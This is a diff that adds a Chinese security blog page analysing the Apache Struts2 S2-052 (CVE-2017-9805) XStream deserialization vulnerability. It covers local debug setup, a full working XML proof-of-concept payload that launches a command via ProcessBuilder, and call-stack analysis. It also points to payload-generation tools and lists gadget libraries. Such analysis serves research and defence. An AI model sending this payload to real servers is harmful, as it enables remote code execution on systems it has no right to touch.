@@ -1,0 +1,457 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>Struts2 S2-052与XStream漏洞调试分析 &#8211; KINGX</title>
+<meta name="description" content="Vulnerability - Java Struts2 S2-052 and XStream">
+<meta name="keywords" content="Vulnerability, Java, Struts2, 漏洞分析">
+
+<!-- Twitter Cards -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kingx.me/images/">
+<meta name="twitter:title" content="Struts2 S2-052与XStream漏洞调试分析">
+<meta name="twitter:description" content="Vulnerability - Java Struts2 S2-052 and XStream">
+<meta name="twitter:creator" content="@https://example.com">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Struts2 S2-052与XStream漏洞调试分析">
+<meta property="og:description" content="Vulnerability - Java Struts2 S2-052 and XStream">
+<meta property="og:url" content="https://kingx.me/Struts2-S2-052.html">
+<meta property="og:site_name" content="KINGX">
+
+
+
+
+
+<link rel="canonical" href="https://kingx.me/Struts2-S2-052.html">
+<link href="https://kingx.me/feed.xml" type="application/atom+xml" rel="alternate" title="KINGX Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="https://kingx.me/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- Load Modernizr -->
+<script src="https://kingx.me/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="https://kingx.me/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="https://kingx.me/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="https://kingx.me/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://kingx.me/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://kingx.me/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://kingx.me/images/apple-touch-icon-144x144-precomposed.png">
+
+
+
+
+<style type="text/css">body {background-image:url(https://kingx.me/images/triangular.png);}</style>
+
+
+</head>
+
+<body id="post" >
+
+<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
+	<button class="dl-trigger">Open Menu</button>
+	<ul class="dl-menu">
+		<li><a href="https://kingx.me/">Home</a></li>
+		<li>
+			<a href="#">About</a>
+			<ul class="dl-submenu">
+				<li>
+					<img src="https://kingx.me/images/avatar.jpg" alt="KINGX photo" class="author-photo">
+					<h4>KINGX</h4>
+					<p>What is Security</p>
+				</li>
+				<li><a href="https://kingx.me/about/"><span class="btn btn-inverse">Learn More</span></a></li>
+				<li>
+					<a href="mailto:root#kingx.me"><i class="fa fa-fw fa-envelope"></i> Email</a>
+				</li>
+				<li>
+					<a href="https://example.com"><i class="fa fa-fw fa-twitter"></i> Twitter</a>
+				</li>
+				<li>
+					<a href="http://example.com"><i class="fa fa-fw fa-weibo"></i> Weibo</a>
+				</li>
+				
+				
+				
+				<li>
+					<a href="https://example.com"><i class="fa fa-fw fa-github"></i> GitHub</a>
+				</li>
+				
+				
+				
+				
+			</ul><!-- /.dl-submenu -->
+		</li>
+		<!-- <li>
+			<a href="#">Posts</a>
+			<ul class="dl-submenu">
+				<li><a href="https://kingx.me/posts/">All Posts</a></li>
+				<li><a href="https://kingx.me/tags/">All Tags</a></li>
+			</ul>
+		</li> -->
+		
+	    
+	    <li><a href="https://kingx.me/latest-events/" >Security Incidents</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/latest-vulns/" >Vulnerabilities</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/pentest-tools/" >Red Team</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/posts/" >Archives</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/tags/" >Tags</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/links/" >Links</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/feed.xml" >RSS</a></li>
+	  
+	</ul><!-- /.dl-menu -->
+</nav><!-- /.dl-menuwrapper -->
+
+
+
+
+<div id="main" role="main">
+  <article class="hentry">
+    <header class="header-title">
+      <div class="header-title-wrap">
+        
+          <h1 class="entry-title"><a href="https://kingx.me/Struts2-S2-052.html" rel="bookmark" title="Struts2 S2-052与XStream漏洞调试分析">Struts2 S2-052与XStream漏洞调试分析</a></h1>
+        
+        <h2><span class="entry-date date published"><time datetime="2017-09-08T00:00:00-04:00">September 08, 2017</time></span></h2>
+        
+        <p class="entry-reading-time">
+          <i class="fa fa-clock-o"></i>
+          
+Reading time ~1 minute
+          
+          <span id="busuanzi_container_page_pv">
+             / Page View <span id="busuanzi_value_page_pv">0</span> / Site Visitor <span id="busuanzi_value_site_uv">0</span>
+          </span>
+          
+        </p><!-- /.entry-reading-time -->
+        
+
+      </div><!-- /.header-title-wrap -->
+    </header>
+    <div class="entry-content">
+      <span class="entry-tags" style="color:red;font-size:13px;margin-bottom: 0px;">「声明：本博客中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。」</span>
+      <h1 id="0-概述">0. 概述</h1>
+
+<p>2017年9月5日，Apache Struts 2官方发布一个严重级别的安全漏洞公告，该漏洞由国外安全研究组织lgtm.com的安全研究人员发现，漏洞编号为CVE-2017-9805（S2-052）,在一定条件下，攻击者可以利用该漏洞远程发送精心构造的恶意数据包，获取业务数据或服务器权限，存在高安全风险。</p>
+
+<p>当Struts2使用REST插件使用XStream的实例xstreamhandler处理反序列化XML时没有进行任何过滤，可以导致远程执行代码，攻击者可以利用该漏洞构造恶意的XML内容获取服务器权限。</p>
+
+<p>利用条件：使用REST插件并在受影响版本范围内。
+利用方式：攻击者构建恶意数据包远程利用。</p>
+
+<p>影响版本：Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p>
+
+<h1 id="1-调试环境搭建">1. 调试环境搭建</h1>
+<p>去官网下载完整的漏洞版本源码包并解压：
+<a href="http://mirrors.tuna.tsinghua.edu.cn/apache/struts/2.5.12/struts-2.5.12-all.zip">http://mirrors.tuna.tsinghua.edu.cn/apache/struts/2.5.12/struts-2.5.12-all.zip</a>。
+在IntelliJ IDEA工作目录新建一个文件夹<code class="highlighter-rouge">Struts2-VulnTest</code>，把源码包中src/apps/rest-showcase整个文件夹拷贝到<code class="highlighter-rouge">Struts2-VulnTest</code>下。</p>
+
+<h2 id="11-设置项目结构">1.1 设置项目结构</h2>
+
+<p>使用IntelliJ IDEA打开<code class="highlighter-rouge">Struts2-VulnTest</code>文件夹，然后打开File -&gt; Project Structure 进行必要设置。点击左侧的Project菜单，在ProjectSDK中设置一个JavaSDK。
+<img src="https://kingx.me/images/articles/201709/struts2/projects.png" alt="projects" /></p>
+
+<p>点击左侧的Modules菜单，点击+号，选择Import Module，把rest-showcase目录添加为一个Maven Module，一直Next就可以了，IDEA会自动识别出其中的Web架构，并识别出各个文件夹的用途，可以在右侧自己手工指定每一个文件夹的用途。</p>
+
+<p><img src="https://kingx.me/images/articles/201709/struts2/modules.png" alt="modules" /></p>
+
+<p><em>Tips：</em>
+<em>1. 在IDEA中，Project下可以有多个Module，相当于Eclipse中Workspace下的多个Project。</em>
+<em>2. IDEA需要预先配置好Maven、Tomcat等环境，具体配置方法自行百度。</em></p>
+
+<p>点击左侧的Facets菜单，此时可以看到中间列表上应该已经有一个Web(struts2-rest-showcase)架构了。如果没有的话点击+号手工添加一下，在添加菜单中选择Web，再选择指定的Module，手工把rest-showcase识别为Web架构。</p>
+
+<p>点击左侧的Artifacts菜单，设置构建选项，基本上按照默认设置就可以了。<code class="highlighter-rouge">struts2-rest-showcase:war exploded</code> 输出路径为<code class="highlighter-rouge">...Struts2-VulnTest/rest-showcase/target/struts2-rest-showcase</code>。<code class="highlighter-rouge">struts2-rest-showcase:war</code>输出路径为<code class="highlighter-rouge">...Struts2-VulnTest/rest-showcase/target</code>。</p>
+
+<p><img src="https://kingx.me/images/articles/201709/struts2/artifacts.png" alt="artifacts" /></p>
+
+<p>设置完成后，点击OK。然后在项目文件树中，右击pom.xml，选择Maven -&gt; Reimport 导入类库。</p>
+
+<h2 id="12-设置启动选项">1.2 设置启动选项</h2>
+<p>接下来配置容器启动选项，选择菜单中的Run -&gt; Edit Configurations，点击+号，选择TomcatServer -&gt; Local。
+在右侧将名称设置为<code class="highlighter-rouge">Struts2-rest-showcase-TestServer</code>。在Server选项卡中设置Tomcat的一些配置选项，JRE选择1.8。然后在Deployment选项卡中点击+号，指定一个Artifact作为启动容器时的部署源。设置Application context，设置为该应用的访问路径，如无特殊需求，保留默认即可。</p>
+
+<p><strong><em>Tips：Java SDK 选择1.8，测试1.7.0_71中未复现成功，在1.8.0_102中成功复现了。</em></strong></p>
+
+<p><img src="https://kingx.me/images/articles/201709/struts2/tomcat.png" alt="tomcat" /></p>
+
+<p>然后点击菜单，Run -&gt; Run ‘Struts2-rest-showcase-TestServer’，进行项目编译并启动Module struts2-rest-showcase。</p>
+
+<p>不出意外可以看到浏览器成功访问到rest-showcase应用：</p>
+
+<p><img src="https://kingx.me/images/articles/201709/struts2/demo.png" alt="demo" /></p>
+
+<h2 id="13-附加源码">1.3 附加源码</h2>
+<p>点击项目结构树中的External Libraries，选择 <code class="highlighter-rouge">Maven: org.apache.struts:struts2-rest-plugin:2.5.12</code>，随便点开一个class，在右侧文件窗口右上角点击Download Sources，自动下载类库对应的源码。</p>
+
+<p><img src="https://kingx.me/images/articles/201709/struts2/downloadsources.png" alt="downloadsources" /></p>
+
+<p>之后就可以在源码中下断点，进行Debug。</p>
+
+<h1 id="2-调试分析">2. 调试分析</h1>
+
+<h2 id="21-漏洞复现">2.1 漏洞复现</h2>
+
+<p>在页面http://localhost:8088/orders/3/edit中点击Submit，拦截HTTP请求并将请求体改为POC Payload，同时将Content-Type Header改为application/xml。</p>
+
+<p>POC Payload为：</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;map&gt;</span> 
+  <span class="nt">&lt;entry&gt;</span> 
+    <span class="nt">&lt;jdk.nashorn.internal.objects.NativeString&gt;</span> 
+      <span class="nt">&lt;flags&gt;</span>0<span class="nt">&lt;/flags&gt;</span>  
+      <span class="nt">&lt;value</span> <span class="na">class=</span><span class="s">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span><span class="nt">&gt;</span> 
+        <span class="nt">&lt;dataHandler&gt;</span> 
+          <span class="nt">&lt;dataSource</span> <span class="na">class=</span><span class="s">"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"</span><span class="nt">&gt;</span> 
+            <span class="nt">&lt;is</span> <span class="na">class=</span><span class="s">"javax.crypto.CipherInputStream"</span><span class="nt">&gt;</span> 
+              <span class="nt">&lt;cipher</span> <span class="na">class=</span><span class="s">"javax.crypto.NullCipher"</span><span class="nt">&gt;</span> 
+                <span class="nt">&lt;initialized&gt;</span>false<span class="nt">&lt;/initialized&gt;</span>  
+                <span class="nt">&lt;opmode&gt;</span>0<span class="nt">&lt;/opmode&gt;</span>  
+                <span class="nt">&lt;serviceIterator</span> <span class="na">class=</span><span class="s">"javax.imageio.spi.FilterIterator"</span><span class="nt">&gt;</span> 
+                  <span class="nt">&lt;iter</span> <span class="na">class=</span><span class="s">"javax.imageio.spi.FilterIterator"</span><span class="nt">&gt;</span> 
+                    <span class="nt">&lt;iter</span> <span class="na">class=</span><span class="s">"java.util.Collections$EmptyIterator"</span><span class="nt">/&gt;</span>  
+                    <span class="nt">&lt;next</span> <span class="na">class=</span><span class="s">"java.lang.ProcessBuilder"</span><span class="nt">&gt;</span> 
+                      <span class="nt">&lt;command&gt;</span> 
+                        <span class="nt">&lt;string&gt;</span>/Applications/Calculator.app/Contents/MacOS/Calculator<span class="nt">&lt;/string&gt;</span> 
+                      <span class="nt">&lt;/command&gt;</span>  
+                      <span class="nt">&lt;redirectErrorStream&gt;</span>false<span class="nt">&lt;/redirectErrorStream&gt;</span> 
+                    <span class="nt">&lt;/next&gt;</span> 
+                  <span class="nt">&lt;/iter&gt;</span>  
+                  <span class="nt">&lt;filter</span> <span class="na">class=</span><span class="s">"javax.imageio.ImageIO$ContainsFilter"</span><span class="nt">&gt;</span> 
+                    <span class="nt">&lt;method&gt;</span> 
+                      <span class="nt">&lt;class&gt;</span>java.lang.ProcessBuilder<span class="nt">&lt;/class&gt;</span>  
+                      <span class="nt">&lt;name&gt;</span>start<span class="nt">&lt;/name&gt;</span>  
+                      <span class="nt">&lt;parameter-types/&gt;</span> 
+                    <span class="nt">&lt;/method&gt;</span>  
+                    <span class="nt">&lt;name&gt;</span>foo<span class="nt">&lt;/name&gt;</span> 
+                  <span class="nt">&lt;/filter&gt;</span>  
+                  <span class="nt">&lt;next</span> <span class="na">class=</span><span class="s">"string"</span><span class="nt">&gt;</span>foo<span class="nt">&lt;/next&gt;</span> 
+                <span class="nt">&lt;/serviceIterator&gt;</span>  
+                <span class="nt">&lt;lock/&gt;</span> 
+              <span class="nt">&lt;/cipher&gt;</span>  
+              <span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">"java.lang.ProcessBuilder$NullInputStream"</span><span class="nt">/&gt;</span>  
+              <span class="nt">&lt;ibuffer/&gt;</span>  
+              <span class="nt">&lt;done&gt;</span>false<span class="nt">&lt;/done&gt;</span>  
+              <span class="nt">&lt;ostart&gt;</span>0<span class="nt">&lt;/ostart&gt;</span>  
+              <span class="nt">&lt;ofinish&gt;</span>0<span class="nt">&lt;/ofinish&gt;</span>  
+              <span class="nt">&lt;closed&gt;</span>false<span class="nt">&lt;/closed&gt;</span> 
+            <span class="nt">&lt;/is&gt;</span>  
+            <span class="nt">&lt;consumed&gt;</span>false<span class="nt">&lt;/consumed&gt;</span> 
+          <span class="nt">&lt;/dataSource&gt;</span>  
+          <span class="nt">&lt;transferFlavors/&gt;</span> 
+        <span class="nt">&lt;/dataHandler&gt;</span>  
+        <span class="nt">&lt;dataLen&gt;</span>0<span class="nt">&lt;/dataLen&gt;</span> 
+      <span class="nt">&lt;/value&gt;</span> 
+    <span class="nt">&lt;/jdk.nashorn.internal.objects.NativeString&gt;</span>  
+    <span class="nt">&lt;jdk.nashorn.internal.objects.NativeString</span> <span class="na">reference=</span><span class="s">"../jdk.nashorn.internal.objects.NativeString"</span><span class="nt">/&gt;</span> 
+  <span class="nt">&lt;/entry&gt;</span>  
+  <span class="nt">&lt;entry&gt;</span> 
+    <span class="nt">&lt;jdk.nashorn.internal.objects.NativeString</span> <span class="na">reference=</span><span class="s">"../../entry/jdk.nashorn.internal.objects.NativeString"</span><span class="nt">/&gt;</span>  
+    <span class="nt">&lt;jdk.nashorn.internal.objects.NativeString</span> <span class="na">reference=</span><span class="s">"../../entry/jdk.nashorn.internal.objects.NativeString"</span><span class="nt">/&gt;</span> 
+  <span class="nt">&lt;/entry&gt;</span> 
+<span class="nt">&lt;/map&gt;</span>
+</code></pre></div></div>
+
+<p>请求发出后，可以看到命令被成功执行，弹出了计算器：
+<img src="https://kingx.me/images/articles/201709/struts2/reproduce.png" alt="reproduce" /></p>
+
+<h2 id="22-漏洞分析">2.2 漏洞分析</h2>
+
+<p>根据官方公告描述漏洞是出现在XStreamHandler中对xml内容进行反序列化过程出现的漏洞，XStreamHandler类主要有fromObject()/toObject()两个方法。我们在toObject()中下一个断点，可以看到上层调用栈中，<code class="highlighter-rouge">ContentTypeInterceptor类</code>会根据请求包的<code class="highlighter-rouge">Content-Type</code>选择对应的Handler进行处理。当Content-Type为”application/xml”时，调用<code class="highlighter-rouge">XStreamHandler.toObject()</code>。</p>
+
+<p><img src="https://kingx.me/images/articles/201709/struts2/stack.png" alt="stack" /></p>
+
+<p>在XStreamHandler.toObject()中，调用 XStream.fromXML() 对xml内容进行反序列化。实际上这个漏洞是XStream中的反序列化问题。</p>
+
+<h3 id="221-xstream的反序列化漏洞">2.2.1 XStream的反序列化漏洞</h3>
+
+<p>去年Jenkins三月份修复了一个可通过低权限用户调用API服务致使的命令执行漏洞（CVE-2016-0792）。低权限用户通过构造一个恶意的XML文档并发送至服务端接口，使服务端解析时调用API执行外部命令。</p>
+
+<p>XStream是一个流行的反序列化库，许多主流应用程序，如IRA、Confluence、Bamboo,和Jenkins等中都使用了该库，另外，它还支持多个主流库，如Spring和Struts2等。由于Jenkins将Groovy文件放在类目录中，因此可以借助XML文件来利用该漏洞。有很多应用都使用XStream库，并且将Groovy文件放在类目录中，研究人员可以仿照此方法在很多开源应用中发现同样的漏洞。</p>
+
+<p>所以对于Jenkins（CVE-2016-0792）漏洞来说，漏洞利用过程是</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JenkinsAPI -&gt; 接收恶意XML -&gt; XStream库对其进行反序列化 -&gt; 结合groovy.util.Expando类完成反序列漏洞利用
+</code></pre></div></div>
+
+<p>关于XStream反序列化漏洞，详见：<a href="https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream?platform=hootsuite">https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream?platform=hootsuite</a></p>
+
+<p>https://github.com/mbechler/marshalsec</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POC构造：
+用marshalsec（https://github.com/mbechler/marshalsec）生成Payload，工具简单使用方式如下：
+java -cpmarshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.&lt;Marshaller  截图和代码较长
+</code></pre></div></div>
+
+<p>Payload生成工具：
+https://github.com/frohoff/ysoserial
+ysoserial</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Apache Commons Collections &lt;= 3.1
+  Apache Commons Collections &lt;= 4.0
+  Groovy &lt;= 2.3.9
+  Spring Core &lt;= 4.1.4(?)
+  JDK &lt;=7u21
+  Apache Commons BeanUtils 1.9.2 + Commons Collections &lt;=3.1 + Commons Logging 1.2 (?)
+  BeanShell 2.0
+  Groovy 2.3.9
+  Jython 2.5.2
+  C3P0 0.9.5.2
+  Apache Commons Fileupload &lt;= 1.3.1 (File uploading)
+  ROME 1.0
+  MyFaces
+  JRMPClient/JRMPListener
+  JSON
+  Hibernate
+</code></pre></div></div>
+
+<h1 id="references">References</h1>
+
+<ol>
+  <li>https://struts.apache.org/docs/s2-052.html</li>
+</ol>
+
+      <footer class="entry-meta">
+        <span class="entry-tags" style="color:black;font-size:13px;margin-bottom: 0px;">欢迎订阅我的微信公众号</span>
+        <img src="/images/secengine.jpg" alt="welcome subscribe"/>
+        <span class="entry-tags"><a href="https://kingx.me/tags/#Vulnerability" title="Pages tagged Vulnerability" class="tag"><span class="term">Vulnerability</span></a><a href="https://kingx.me/tags/#Java" title="Pages tagged Java" class="tag"><span class="term">Java</span></a><a href="https://kingx.me/tags/#Struts2" title="Pages tagged Struts2" class="tag"><span class="term">Struts2</span></a><a href="https://kingx.me/tags/#漏洞分析" title="Pages tagged 漏洞分析" class="tag"><span class="term">漏洞分析</span></a></span>
+        
+        <div class="social-share">
+  <ul class="socialcount socialcount-small inline-list">
+    <li class="weibo"><a href="http://service.weibo.com/share/share.php?title=分享KINGX的文章《Struts2 S2-052与XStream漏洞调试分析》&url=https://kingx.me/Struts2-S2-052.html&source=bookmark" title="Share on Weibo" target="_blank"><span class="count"><i class="fa fa-weibo"></i> WEIBO</span></a></li>
+    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=https://kingx.me/Struts2-S2-052.html" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
+    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=https://kingx.me/Struts2-S2-052.html" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
+    <li class="googleplus"><a href="https://plus.google.com/share?url=https://kingx.me/Struts2-S2-052.html" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
+  </ul>
+</div><!-- /.social-share -->
+<!--
+<div class="ds-share" data-thread-key="/Struts2-S2-052" data-title="Struts2 S2-052与XStream漏洞调试分析" data-images="" data-content="Struts2 S2-052与XStream漏洞调试分析" data-url="https://kingx.me/Struts2-S2-052.html">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+        <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+</div>
+-->
+      </footer>
+    </div><!-- /.entry-content -->
+    
+    
+
+    <div class="read-more">
+  
+    <div class="read-more-header">
+      
+        <a href="https://kingx.me/WebAssembly.html" class="read-more-btn">Read More</a>
+      
+    </div><!-- /.read-more-header -->
+    <div class="read-more-content">
+      
+      <h3><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" title="如何绕过高版本JDK的限制进行JNDI注入利用">如何绕过高版本JDK的限制进行JNDI注入利用</a></h3>
+      <p>Restrictions of JNDI Manipulation RCE & Bypass <a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">Continue reading</a></p>
+      
+    </div><!-- /.read-more-content -->
+  
+  <div class="read-more-list">
+    
+      
+      <div class="list-item">
+        <h4><a href="https://kingx.me/Thinking-about-Red-Teaming.html" title="【红蓝对抗】大型互联网企业安全蓝军建设">【红蓝对抗】大型互联网企业安全蓝军建设</a></h4>
+        <span>Published on March 12, 2019</span>
+      </div><!-- /.list-item -->
+      
+    
+      
+      <div class="list-item">
+        <h4><a href="https://kingx.me/CobaltStrike-Patch.html" title="内网渗透有它就够了，手把手教你分析CobaltStrike3.12">内网渗透有它就够了，手把手教你分析CobaltStrike3.12</a></h4>
+        <span>Published on November 19, 2018</span>
+      </div><!-- /.list-item -->
+      
+    
+  </div><!-- /.read-more-list -->
+</div><!-- /.read-more -->
+  </article>
+</div><!-- /#main -->
+
+<div class="footer-wrapper">
+  <footer role="contentinfo">
+    <span>&copy; 2019 KINGX. Powered by Jekyll using the HPSTR Theme.</span>
+  </footer>
+</div><!-- /.footer-wrapper -->
+
+<!--<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>-->
+<!-- <script src="http://libs.baidu.com/jquery/1.9.1/jquery.min.js"></script> -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="https://kingx.me/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script src="https://kingx.me/assets/js/scripts.min.js"></script>
+
+
+
+
+<script>
+
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  if(location.host=="kingx.me"){
+    hm.src = "https://hm.baidu.com/hm.js?d11d8512e0bc6992b9c9bbf2d266ce31";
+  }else if(location.host=="kingx.sinaapp.com"){
+    hm.src = "https://hm.baidu.com/hm.js?d1b3dbd97b73868454f102755fdf51ba";
+  }
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Busuanzi Analytics -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+	        
+
+</body>
+</html>
